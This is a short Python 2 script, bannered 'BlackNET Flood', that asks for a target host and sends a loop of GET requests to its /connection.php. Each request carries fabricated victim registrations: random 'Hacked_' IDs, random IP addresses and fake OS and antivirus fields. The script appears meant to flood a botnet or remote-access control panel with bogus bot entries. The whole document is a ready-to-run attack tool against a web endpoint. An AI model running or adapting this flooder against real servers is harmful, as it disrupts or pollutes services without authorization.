import requests
import os
import random
import string
import json
import socket
import struct
print "______ _            _    _   _  _____ _____  ______ _                 _"
print "| ___ \ |          | |  | \ | ||  ___|_   _| |  ___| |               | |"
print "| |_/ / | __ _  ___| | _|  \| || |__   | |   | |_  | | ___   ___   __| |"
print "| ___ \ |/ _` |/ __| |/ / . ` ||  __|  | |   |  _| | |/ _ \ / _ \ / _` |"
print "| |_/ / | (_| | (__|   <| |\  || |___  | |   | |   | | (_) | (_) | (_| |"
print "\____/|_|\__,_|\___|_|\_\_| \_/\____/  \_/   \_|   |_|\___/ \___/ \__,_|"
print ""

chars = string.ascii_uppercase + string.digits
random.seed = (os.urandom(1024))
URL = "http://" + raw_input('Enter Your Target : ') + "/connection.php"
count = 0
print "Target is %s" % URL
print ""     
print "Attack Started"
print "--------------------------------"
while(count < 10):
    ipadd = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
    username ="Hacked_" + ''.join(random.choice(chars) for i in range(7))
    requests.get(url = URL, params = {
		'VicID': username,
		'ipadress': ipadd,
        'os': "Microsoft Windows 8.1 Pro x64",
        'antivirus': "Microsoft Windows Defender",
        'status': "Online"
})
    count = count + 1
    print 'Sending Victim ID %s and IPAddress %s' % (username,ipadd)
